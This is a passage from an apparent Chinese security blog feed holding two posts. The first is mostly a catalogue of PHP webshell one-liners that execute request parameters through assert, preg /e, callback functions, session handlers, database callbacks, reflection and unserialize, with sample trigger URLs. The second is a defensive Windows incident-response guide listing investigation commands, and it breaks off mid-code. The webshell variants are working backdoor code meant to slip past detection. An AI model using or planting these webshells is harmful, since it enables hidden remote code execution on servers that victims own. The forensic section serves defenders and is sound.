php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> preg_filter(<span class="string">&#x27;|.*|e&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="其他回调"><a href="#其他回调" class="headerlink" title="其他回调"></a>其他回调</h2><h3 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function"></a>register_shutdown_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line">register_shutdown_function(<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="register-tick-function"><a href="#register-tick-function" class="headerlink" title="register_tick_function"></a>register_tick_function</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line">register_tick_function (<span class="variable">$e</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="filter-var"><a href="#filter-var" class="headerlink" title="filter_var"></a>filter_var</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">filter_var(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>));</span><br><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure><h3 id="mb-ereg-replace-callback"><a href="#mb-ereg-replace-callback" class="headerlink" title="mb_ereg_replace_callback"></a>mb_ereg_replace_callback</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_ereg_replace_callback(<span class="string">&#x27;.+&#x27;</span>, create_function(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>),<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="set-exception-handler"><a href="#set-exception-handler" class="headerlink" title="set_exception_handler"></a>set_exception_handler</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set_exception_handler(create_function(&#x27;&#x27;,&#x27;return assert($_GET[k]);&#x27;));</span><br><span class="line">throw new exception();</span><br></pre></td></tr></table></figure><h3 id="forward-static-call"><a href="#forward-static-call" class="headerlink" title="forward_static_call"></a>forward_static_call</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    forward_static_call(<span class="string">&#x27;assert&#x27;</span>,<span class="variable">$args</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> a(<span class="variable">$_POST</span>[k]);</span><br></pre></td></tr></table></figure><h3 id="iterator-apply"><a href="#iterator-apply" class="headerlink" title="iterator_apply"></a>iterator_apply</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iterator_apply(<span class="keyword">new</span> <span class="built_in">arrayiterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>])),create_function(<span class="string">&#x27;Iterator $i&#x27;</span>,<span class="string">&#x27;assert($i-&gt;current());&#x27;</span>),<span class="keyword">array</span>(<span class="keyword">new</span> <span class="built_in">arrayiterator</span>(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]))));</span><br></pre></td></tr></table></figure><h3 id="array-intersect-ukey"><a href="#array-intersect-ukey" class="headerlink" title="array_intersect_ukey"></a>array_intersect_ukey</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_intersect_ukey(<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;1&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="array-uintersect-uassoc"><a href="#array-uintersect-uassoc" class="headerlink" title="array_uintersect_uassoc"></a>array_uintersect_uassoc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_uintersect_uassoc(<span class="keyword">array</span>(<span class="variable">$_GET</span>[k]),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;strstr&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="array-intersect-uassoc"><a href="#array-intersect-uassoc" class="headerlink" title="array_intersect_uassoc"></a>array_intersect_uassoc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_intersect_uassoc(<span class="keyword">array</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;k&#x27;</span>]=&gt;<span class="string">&#x27;&#x27;</span>),<span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>),<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="filter-var-1"><a href="#filter-var-1" class="headerlink" title="filter_var"></a>filter_var</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var(<span class="string">&quot;phpinfo();&quot;</span> ,<span class="number">1024</span>, <span class="keyword">array</span>(<span class="string">&quot;options&quot;</span> =&gt; <span class="string">&quot;assert&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="filter-var-array"><a href="#filter-var-array" class="headerlink" title="filter_var_array"></a>filter_var_array</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter_var_array(<span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]), <span class="keyword">array</span>(<span class="string">&#x27;test&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;filter&#x27;</span> =&gt; FILTER_CALLBACK, <span class="string">&#x27;options&#x27;</span> =&gt; <span class="string">&#x27;assert&#x27;</span>)));</span><br></pre></td></tr></table></figure><h3 id="preg-replace-callback"><a href="#preg-replace-callback" class="headerlink" title="preg_replace_callback"></a>preg_replace_callback</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace_callback(<span class="string">&#x27;/. /i&#x27;</span>, create_function(<span class="string">&#x27;$arr&#x27;</span>, <span class="string">&#x27;return assert($arr[0]);&#x27;</span>), <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><h3 id="无回显回调后门ob-start"><a href="#无回显回调后门ob-start" class="headerlink" title="无回显回调后门ob_start"></a>无回显回调后门ob_start</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ob_start(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure><h3 id="create-function创建回调函数"><a href="#create-function创建回调函数" class="headerlink" title="create_function创建回调函数"></a>create_function创建回调函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mem</span> = <span class="keyword">new</span> Memcache();</span><br><span class="line"><span class="variable">$re</span> = <span class="variable">$mem</span>-&gt;addServer(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">11211</span>, <span class="literal">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="literal">TRUE</span>, create_function(<span class="string">&#x27;$a,$b,$c,$d,$e&#x27;</span>, <span class="string">&#x27;return assert($a);&#x27;</span>));</span><br><span class="line"><span class="variable">$mem</span>-&gt;connect(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="CallbackFilterIterator创建回调函数"><a href="#CallbackFilterIterator创建回调函数" class="headerlink" title="CallbackFilterIterator创建回调函数"></a>CallbackFilterIterator创建回调函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$iterator</span> = <span class="keyword">new</span> <span class="built_in">CallbackFilterIterator</span>(<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>],)), create_function(<span class="string">&#x27;$a&#x27;</span>, <span class="string">&#x27;assert($a);&#x27;</span>));</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$iterator</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">echo</span> <span class="variable">$item</span>;&#125;</span><br></pre></td></tr></table></figure><h3 id="session-set-save-handler"><a href="#session-set-save-handler" class="headerlink" title="session_set_save_handler"></a>session_set_save_handler</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$para</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    session_set_save_handler(<span class="string">&quot;open&quot;</span>, <span class="string">&quot;close&quot;</span>, <span class="variable">$para</span>, <span class="string">&quot;write&quot;</span>, <span class="string">&quot;destroy&quot;</span>, <span class="string">&quot;gc&quot;</span>);</span><br><span class="line">    @session_start(); <span class="comment">// 打开会话</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$session</span> = base64_decode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">// open第一个被调用，类似类的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$save_path</span>, <span class="variable">$session_name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// close最后一个被调用，类似 类的析构函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 执行session_id($_REQUEST[&#x27;op&#x27;])后，PHP自动会进行read操作，因为我们为read callback赋值了assert操作，等价于执行assert($_REQUEST[&#x27;op&#x27;])</span></span><br><span class="line">session_id(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;op&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$id</span>, <span class="variable">$sess_data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 第三个参数为read  read(string $sessionId)</span></span><br><span class="line">test(<span class="variable">$session</span>);</span><br></pre></td></tr></table></figure><h3 id="扩展中的回调函数如sqlite-pdo-yaml-memcached等"><a href="#扩展中的回调函数如sqlite-pdo-yaml-memcached等" class="headerlink" title="扩展中的回调函数如sqlite/pdo/yaml/memcached等"></a>扩展中的回调函数如sqlite/pdo/yaml/memcached等</h3><p>PDO数据库回调</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;sqlite:sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;sqliteCreateFunction(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$sth</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT myfunc(:exec)&quot;</span>);</span><br><span class="line"><span class="variable">$sth</span>-&gt;execute(<span class="keyword">array</span>(<span class="string">&#x27;:exec&#x27;</span> =&gt; <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br></pre></td></tr></table></figure><p>SQLite3 数据库回调</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$e</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;e&#x27;</span>];</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;createFunction(<span class="string">&#x27;myfunc&#x27;</span>, <span class="variable">$e</span>);</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT myfunc(?)&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;bindValue(<span class="number">1</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>], SQLITE3_TEXT);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;execute();</span><br></pre></td></tr></table></figure><p>php_yaml库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = urlencode(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="variable">$yaml</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">greeting: !<span class="subst">&#123;$str&#125;</span> &quot;|. |e&quot;</span></span><br><span class="line"><span class="string">EOD</span>;</span><br><span class="line"><span class="variable">$parsed</span> = yaml_parse(<span class="variable">$yaml</span>, <span class="number">0</span>, <span class="variable">$cnt</span>, <span class="keyword">array</span>(<span class="string">&quot;!<span class="subst">&#123;$_REQUEST[&#x27;pass&#x27;]&#125;</span>&quot;</span> =&gt; <span class="string">&#x27;preg_replace&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="反射技术"><a href="#反射技术" class="headerlink" title="反射技术"></a>反射技术</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="keyword">new</span> ReflectionFunction(<span class="variable">$_GET</span>[m]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$func</span>-&gt;invokeArgs(<span class="keyword">array</span>(<span class="variable">$_GET</span>[c]));</span><br></pre></td></tr></table></figure><blockquote><p><code>xx.com/shell.php?m=assert&amp;c=phpinfo();</code></p></blockquote><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>=<span class="string">&quot;text&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file_name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">unserialize(<span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.php?id=id=O:<span class="number">3</span>:<span class="string">&quot;foo&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> Webshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows应急溯源</title>
      <link href="/p/f6d1c791.html"/>
      <url>/p/f6d1c791.html</url>
      
        <content type="html"><![CDATA[<p>我非常赞同曾经看到的一句话，<strong>一旦你能够确定本次安全事件的类型，猜测出攻击者或者恶意代码的攻击思路，然后去验证排查这些猜想，就会加速你的分析过程</strong>。在做应急溯源的过程中，很多时候通过一两点线索，拼凑攻击者链条的画像，用下文提到的排查方法，去补充证据来证明自己的猜想。（正如打游戏要预判敌人走位，应急也要预判攻击者的行为）当然受限于自己知识的局限性还是很可能误判的，在应急中误判又是特别致命的，可能一个误操作就会为客户带来不可估量的损失。所以我个人认为现场溯源应急至少要3个人以上，互相弥补吧。</p><h1 id="系统基本信息"><a href="#系统基本信息" class="headerlink" title="系统基本信息"></a>系统基本信息</h1><p>系统信息概述</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><p>详细信息</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msinfo32</span><br></pre></td></tr></table></figure><blockquote><p>显示本地计算机硬件资源、组件、软件环境；正在运行的任务，服务、驱动、加载模块、启动程序</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119110244574.png" alt="image-20211119110244574"></p><ul><li>正在运行的任务</li><li>服务</li><li>驱动程序</li><li>加载的模块</li><li>启动程序</li></ul><h2 id="系统账号（用户信息）"><a href="#系统账号（用户信息）" class="headerlink" title="系统账号（用户信息）"></a>系统账号（用户信息）</h2><p>预判攻击者利用账号的可能性：</p><ol><li>直接建立新账号（可能和系统常用名类似）</li><li>激活系统中默认账号（这个账号存在很久不经常使用）</li><li>创建隐藏账号（账户名后<code>$</code>）</li></ol><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><p>查看具体账号的详细信息，<code>username</code>为具体用户名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user username</span><br></pre></td></tr></table></figure><h3 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lusrmgr.msc</span><br></pre></td></tr></table></figure><p><code>win+r</code> –&gt; <strong>compmgmt.msc</strong>(计算机管理窗口) –&gt; 本地用户和组 –&gt; 用户</p><h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><p><code>win+r</code> –&gt;<strong>regedit</strong>(注册表编辑器) –&gt; HKEY_LOCAL_MACHINE –&gt; SAM</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119114330813.png" alt="image-20211119114330813"></p><blockquote><p>启动继承，方框✔；F5刷新后查看用户信息。</p></blockquote><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119114848417.png" alt="image-20211119114848417"></p><h4 id="克隆账号"><a href="#克隆账号" class="headerlink" title="克隆账号"></a>克隆账号</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211119114530559.png" alt="image-20211119114530559"></p><p>计算机<code>\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4</code></p><p><strong>F值</strong>和<code>000001F4</code>相同即为克隆账户</p><h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><h2 id="启动项"><a href="#启动项" class="headerlink" title="启动项"></a>启动项</h2><h3 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msconfig</span><br></pre></td></tr></table></figure><blockquote><p>在系统配置对话框中选择启动选项卡</p></blockquote><h3 id="注册表-1"><a href="#注册表-1" class="headerlink" title="注册表"></a>注册表</h3><p>注册表是操作是操作系统中重要的数据库，很多病毒通过注册表来实现持久化驻留。</p><p>注册表含义：</p><p>(1)<code>HKEY_CLASSES_ROOT(HKCR)</code> 确保资源管理器中执行时打开正确的程序</p><p>(2)<code>HKEY_CURRENT_USER(HKCU)</code> 当前登录系统的用户配置</p><p>(3)<code>HKEY_LOCAL_MACHINE(HKLM)</code> 计算机硬件特定信息</p><p>(4)<code>HKEY_USERS(HKU)</code> 所有用户配置文件的配置信息</p><p>(5)<code>HKEY_CURRENT_CONFIG(HCU)</code> 存储有关系统当前配置信息</p><h3 id="Autoruns"><a href="#Autoruns" class="headerlink" title="Autoruns"></a>Autoruns</h3><p><a href="https://www.sysgeek.cn/autoruns/">https://www.sysgeek.cn/autoruns/</a></p><h2 id="任务计划"><a href="#任务计划" class="headerlink" title="任务计划"></a>任务计划</h2><p>cmd下执行命令<code>compmgmt.msc</code>(计算机管理窗口) –&gt; 任务计划程序</p><p>powershell执行<code>Get-ScheduledTask</code>返回路径，名称，状态</p><p>命令行下执行<code>schtasks</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件夹: \Microsoft\XblGameSave</span><br><span class="line">任务名                                   下次运行时间           模式</span><br><span class="line">======================================== ====================== ===============</span><br><span class="line">XblGameSaveTask                          N/A                    就绪</span><br></pre></td></tr></table></figure><blockquote><p>获取任务计划必须是本地Administrators组的</p></blockquote><h1 id="进程排查"><a href="#进程排查" class="headerlink" title="进程排查"></a>进程排查</h1><p>主要目的：找到恶意进程的PID、程序路径、PPID、程序加载的DLL。</p><p><code>taskmgr</code>    添加命令行和映射路径名称</p><h2 id="tasklist"><a href="#tasklist" class="headerlink" title="tasklist"></a>tasklist</h2><p>在cmd执行<code>tasklist</code>映像名称,PID 会话名,会话,内存使用</p><p><code>tasklist /svc</code>  映像名称–PID–服务 #进程和服务的对应关系</p><p><code>tasklist /m | more</code> 映像名称–PID–模块 #加载DLL的恶意进程</p><p><code>tasklist /m ntdll.dll</code> 查看指定模块的进程（如ntdll.dll）</p><h3 id="fi过滤器"><a href="#fi过滤器" class="headerlink" title="fi过滤器"></a><code>fi</code>过滤器</h3><p><code>eq</code> 等于</p><p><code>ne</code> 不等于</p><p><code>gt</code> 大于</p><p><code>lt</code> 小于</p><p><code>ge</code> 大于等于</p><p><code>le</code> 小于等于</p><p><code>tasklist /svc /fi &#39;PID eq 7440&#39;</code>  #PID为7440的进程</p><h2 id="netstat-网络信息查询"><a href="#netstat-网络信息查询" class="headerlink" title="netstat 网络信息查询"></a>netstat 网络信息查询</h2><p>1.通过netstat定位有网络连接的PID</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;ESTABLISHED&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p>LISTENING:监听状态</p><p>ESTABLISHED:建立连接</p><p>CLOSE_WAIT:对方主动关闭连接，或网络异常导致连接中断</p></blockquote><p>2.通过tasklist对PID程序定位</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tasklist|findstr <span class="string">&quot;12308&quot;</span></span><br><span class="line">chrome.exe                   <span class="number">12308</span> Console                    <span class="number">1</span>     <span class="number">31</span>,<span class="number">252</span> K</span><br><span class="line">tasklist /fi <span class="string">&quot;PID eq 12308&quot;</span></span><br><span class="line"></span><br><span class="line">映像名称                       PID 会话名              会话<span class="comment">#       内存使用</span></span><br><span class="line">========================= ======== ================ =========== ============</span><br><span class="line">chrome.exe                   <span class="number">12308</span> Console                    <span class="number">1</span>     <span class="number">30</span>,<span class="number">764</span> K</span><br></pre></td></tr></table></figure><p><code>netstat -anb</code> #快速定位端口对应程序(需要管理员权限)</p><p>或者使用TCPView</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211122145838245.png" alt="image-20211122145838245"></p><h2 id="powershell排查确认子父进程之间的关系"><a href="#powershell排查确认子父进程之间的关系" class="headerlink" title="powershell排查确认子父进程之间的关系"></a>powershell排查确认子父进程之间的关系</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Process | <span class="built_in">select</span> name,processid,parentprocessid,path</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-WmiObject</span> Win32_Process</span><br></pre></td></tr></table></figure><blockquote><p>获取进程的所有信息</p></blockquote><h2 id="wmic-process"><a href="#wmic-process" class="headerlink" title="wmic process"></a>wmic process</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wmic <span class="keyword">process</span> get name,processid,parentprocessid /format:csv</span><br><span 